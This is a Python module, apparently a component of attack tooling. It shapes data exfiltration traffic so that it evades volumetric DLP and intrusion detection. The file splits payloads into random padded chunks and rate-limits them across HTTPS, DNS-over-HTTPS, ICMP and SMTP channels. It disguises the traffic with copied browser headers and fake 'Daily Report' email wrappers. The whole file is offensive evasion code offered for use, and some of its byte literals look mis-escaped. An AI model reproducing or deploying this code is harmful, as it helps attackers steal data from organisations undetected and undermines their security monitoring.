"""
Volume Obfuscation for Exfiltration
Limits and shapes outbound traffic to avoid volumetric DLP/IDS thresholds.

Features:
- Chunked exfiltration with random padding
- Per-channel rate limiting
- Burst smoothing across multiple fallback channels
- Protocol header mimicry for common services
"""
from __future__ import annotations

import random
import time
import hashlib
import base64
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum


class ExfilChannel(str, Enum):
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"
    SMTP = "smtp"
    SMB = "smb"
    DOH = "doh"
    TELEGRAM = "telegram"


@dataclass
class ChannelBudget:
    channel: ExfilChannel
    max_bytes_per_min: int = 1024 * 1024
    max_packet_size: int = 1500
    max_requests_per_min: int = 120
    padding_min: int = 0
    padding_max: int = 256
    enabled: bool = True


@dataclass
class VolumeObfuscatorConfig:
    channels: List[ChannelBudget] = field(default_factory=lambda: [
        ChannelBudget(ExfilChannel.HTTPS, max_bytes_per_min=512 * 1024, max_packet_size=1400),
        ChannelBudget(ExfilChannel.DOH, max_bytes_per_min=256 * 1024, max_packet_size=1200),
        ChannelBudget(ExfilChannel.ICMP, max_bytes_per_min=128 * 1024, max_packet_size=1300),
    ])
    chunk_min: int = 256
    chunk_max: int = 4096
    split_large_payloads: bool = True
    mimic_protocols: bool = True


class VolumeObfuscator:
    """
    Shape exfiltration traffic to blend into normal traffic profiles.
    """

    def __init__(self, config: VolumeObfuscatorConfig):
        self.config = config
        self._channel_state: Dict[ExfilChannel, Dict[str, int]] = {
            c.channel: {"bytes": 0, "requests": 0, "ts": int(time.time() / 60)} for c in config.channels if c.enabled
        }

    def chunk_payload(self, data: bytes) -> List[bytes]:
        """Split payload into randomized chunks."""
        cfg = self.config
        if not cfg.split_large_payloads or len(data) <= cfg.chunk_max:
            return [data]
        chunks: List[bytes] = []
        offset = 0
        while offset < len(data):
            size = random.randint(cfg.chunk_min, cfg.chunk_max)
            size = min(size, len(data) - offset)
            chunks.append(data[offset:offset + size])
            offset += size
        return chunks

    def apply_padding(self, chunk: bytes, channel: ExfilChannel) -> bytes:
        """Apply random padding to a chunk."""
        budgets = {c.channel: c for c in self.config.channels}
        budget = budgets.get(channel)
        if not budget:
            return chunk
        pad = random.randint(budget.padding_min, budget.padding_max)
        if pad <= 0:
            return chunk
        noise = bytes(random.randint(0, 255) for _ in range(pad))
        return chunk + noise

    def rate_limiter(self, channel: ExfilChannel, bytes_to_send: int) -> Tuple[bool, Optional[float]]:
        """Check if sending `bytes_to_send` is allowed on `channel`."""
        state = self._channel_state.get(channel)
        if not state:
            return True, None
        budgets = {c.channel: c for c in self.config.channels}
        budget = budgets.get(channel)
        if not budget:
            return True, None
        now_min = int(time.time() / 60)
        if state["ts"] != now_min:
            state["bytes"] = 0
            state["requests"] = 0
            state["ts"] = now_min
        if state["bytes"] + bytes_to_send > budget.max_bytes_per_min:
            wait = max(0.0, 60.0 - (time.time() % 60))
            return False, wait
        if state["requests"] + 1 > budget.max_requests_per_min:
            wait = max(0.0, 60.0 - (time.time() % 60))
            return False, wait
        state["bytes"] += bytes_to_send
        state["requests"] += 1
        return True, None

    def mimic_headers(self, channel: ExfilChannel) -> Dict[str, str]:
        """Return headers that make traffic look like legitimate protocol."""
        if not self.config.mimic_protocols:
            return {}
        profiles = {
            ExfilChannel.HTTP: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0",
                "Accept": "text/html,application/xhtml+xml",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache",
            },
            ExfilChannel.HTTPS: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0",
                "Accept": "application/octet-stream",
                "Accept-Language": "en-US,en;q=0.9",
            },
            ExfilChannel.DOH: {
                "Accept": "application/dns-message",
                "Content-Type": "application/dns-message",
            },
            ExfilChannel.SMTP: {
                "Content-Type": "text/plain; charset=utf-8",
                "Subject": "Status Report",
            },
        }
        return profiles.get(channel, {})

    def encode_for_channel(self, data: bytes, channel: ExfilChannel) -> bytes:
        """Encode data for a specific channel."""
        if channel == ExfilChannel.DOH:
            return self._encode_dns(data)
        if channel == ExfilChannel.ICMP:
            return self._encode_icmp(data)
        if channel == ExfilChannel.SMTP:
            return self._encode_smtp(data)
        return data

    def _encode_dns(self, data: bytes) -> bytes:
        """Encode data as pseudo-DNS labels (base32)."""
        encoded = base64.b32encode(data).decode().rstrip("=")
        return encoded.encode()

    def _encode_icmp(self, data: bytes) -> bytes:
        """Prepend ICMP echo payload header."""
        return b"\\x00\\x00" + data

    def _encode_smtp(self, data: bytes) -> bytes:
        """Wrap data as email body."""
        return b"Subject: Daily Report\\r\\n\\r\\n" + data

    def report(self) -> Dict[str, Any]:
        """Return current channel utilization report."""
        out: Dict[str, Any] = {"channels": []}
        for name, state in self._channel_state.items():
            budgets = {c.channel: c for c in self.config.channels}
            budget = budgets.get(name)
            cap = budget.max_bytes_per_min if budget else 0
            out["channels"].append({
                "channel": name.value if isinstance(name, ExfilChannel) else name,
                "bytes_used": state["bytes"],
                "bytes_cap": cap,
                "requests": state["requests"],
                "minute": state["ts"]
            })
        return out
